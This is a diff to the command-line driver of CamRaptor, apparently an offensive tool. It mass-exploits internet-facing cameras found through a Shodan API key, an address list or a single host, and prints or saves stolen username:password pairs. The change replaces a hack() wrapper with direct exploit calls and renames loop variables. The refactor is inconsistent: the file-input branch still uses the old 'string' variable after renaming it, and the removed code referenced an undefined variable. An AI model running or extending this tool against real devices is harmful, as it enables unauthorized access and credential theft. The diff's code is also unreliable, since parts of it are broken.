@@ -43,14 +43,8 @@ class CamRaptorCLI(CamRaptor, Badges):
     parser.add_argument('--api', dest='api', help='Shodan API key for exploiting devices over Internet.')
     args = parser.parse_args()
 
-    def hack(self, host):
-        username, password = self.exploit(response)
-
-        if username is not None and password is not None:
-            return f"({host}) - {username}:{password}"
-
     def thread(self, address):
-        result = self.hack(address)
+        result = self.exploit(address)
         if result:
             if not self.args.output:
                 self.print_success(result)
@@ -72,16 +66,16 @@ class CamRaptorCLI(CamRaptor, Badges):
                 return
             self.print_success("Authorization successfully completed!")
 
-            string = "/-\|"
+            line = "/-\|"
             counter = 0
 
             for address in addresses:
-                if counter >= len(string):
+                if counter >= len(line):
                     counter = 0
-                self.print_multi(f"Exploiting... ({address}) {string[counter]}")
+                self.print_multi(f"Exploiting... ({address}) {line[counter]}")
 
                 if not self.args.threads:
-                    result = hack(address)
+                    result = self.exploit(address)
                     if result:
                         if not self.args.output:
                             self.print_success(f"\033[1K\r{result}")
@@ -95,19 +89,18 @@ class CamRaptorCLI(CamRaptor, Badges):
 
         elif self.args.input:
             with open(self.args.input, 'r') as f:
-                lines = f.read().strip().split('\n')
-                line_number = 0
+                addresses = f.read().strip().split('\n')
 
-                string = "/-\|"
+                line = "/-\|"
                 counter = 0
 
-                for line in lines:
+                for address in addresses:
                     if counter >= len(string):
                         counter = 0
                     self.print_multi(f"Exploiting... ({address}) {string[counter]}")
 
                     if not self.args.threads:
-                        result = self.hack(line)
+                        result = self.exploit(address)
                         if result:
                             if not self.args.output:
                                 self.print_success(f"\033[1K\r{result}")
@@ -115,13 +108,13 @@ class CamRaptorCLI(CamRaptor, Badges):
                                 with open(self.args.output, 'a') as f:
                                     f.write(f"{result}\n")
                     else:
-                        process = threading.Thread(target=self.thread, args=[line])
+                        process = threading.Thread(target=self.thread, args=[address])
                         process.start()
                     counter += 1
 
         elif self.args.address:
             self.print_process(f"Exploiting {self.args.address}...")
-            result = self.hack(self.args.address)
+            result = self.exploit(self.args.address)
             if result:
                 if not self.args.output:
                     self.print_success(result)
